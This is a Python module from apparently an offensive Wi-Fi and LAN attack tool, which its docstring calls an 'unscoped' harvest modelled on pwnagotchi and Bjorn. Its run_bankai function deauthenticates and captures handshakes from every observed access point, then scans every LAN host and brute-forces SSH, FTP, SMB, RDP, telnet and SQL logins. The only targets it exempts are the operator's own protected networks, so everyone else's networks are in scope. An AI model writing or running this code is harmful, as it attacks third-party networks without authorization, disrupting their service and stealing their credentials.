"""BANKAI - the unscoped Kuroshuna harvest (full pwnagotchi + Bjorn behaviour).

Gated by broadcast_allowed(). Walks every OBSERVED network + every LAN host and
attacks them ALL -- except it routes each through gate.auto_hostile_add(), which
HARD-REFUSES protect_bssids/own_infra. So "unscoped" means everything-except-your-
own-gear. The RF/net actions are injected so this is unit-testable.
"""
from __future__ import annotations

PORT_PROTO = {22: "ssh", 21: "ftp", 445: "smb", 3389: "rdp", 23: "telnet", 3306: "sql"}


def run_bankai(gate, *, observed, lan_hosts, rf_deauth, rf_capture,
               net_scan, net_brute) -> dict:
    allowed, why = gate.broadcast_allowed()
    if not allowed:
        gate.audit({"tier": "B", "action": "bankai", "target": "*",
                    "allowed": False, "reason": why})
        return {"ok": False, "reason": why, "armed_targets": 0}
    armed = 0
    # RF: deauth + capture every observed AP we're allowed to arm
    for n in observed:
        b = (n.get("bssid") or "")
        if not b or not gate.auto_hostile_add(b, evidence="bankai"):
            continue   # auto_hostile_add refuses protect_bssids/own_infra
        armed += 1
        try:
            rf_deauth(b)
            rf_capture(b, n.get("channel") or 6)
        except Exception:
            pass
    # LAN: scan + brute every host we're allowed to arm (Bjorn-style)
    for h in lan_hosts:
        if not gate.auto_hostile_add(h, evidence="bankai"):
            continue
        armed += 1
        try:
            for port in (net_scan(h) or []):
                proto = PORT_PROTO.get(port)
                if proto:
                    net_brute(h, proto)
        except Exception:
            pass
    gate.audit({"tier": "B", "action": "bankai", "target": "*",
                "allowed": True, "reason": f"armed {armed} observed targets"})
    return {"ok": True, "reason": "bankai harvest", "armed_targets": armed}
